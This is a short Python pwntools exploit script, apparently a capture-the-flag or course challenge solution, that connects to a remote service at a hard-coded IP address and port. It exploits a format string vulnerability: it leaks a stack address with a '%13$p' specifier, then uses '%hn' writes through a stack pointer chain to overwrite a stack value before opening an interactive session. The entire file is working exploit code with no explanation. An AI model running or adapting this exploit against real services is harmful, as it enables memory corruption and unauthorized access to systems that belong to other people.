from pwn import *

r = remote('140.112.249.144',30001)

def get_ptr(loc):
    r.recvuntil(':')
    r.sendline('%{}$p'.format(loc).ljust(14,' ').encode())
    output = r.recvuntil('is')
    return int(output[:-3], 16)

def write_val(stack, loc, val):
    r.recvuntil(':')
    _loc = (stack+loc) & 0xffff
    r.sendline('%{}c%13$hn'.format(_loc).ljust(14, ' ').encode())
    r.recvuntil(':')
    r.sendline('%{}c%39$hn'.format(val).ljust(14, ' ').encode())

stack = get_ptr(13) - 0x108

write_val(stack, 6, (20202020>>16)&0xffff)
write_val(stack, 4, 20202020&0xffff)

r.interactive()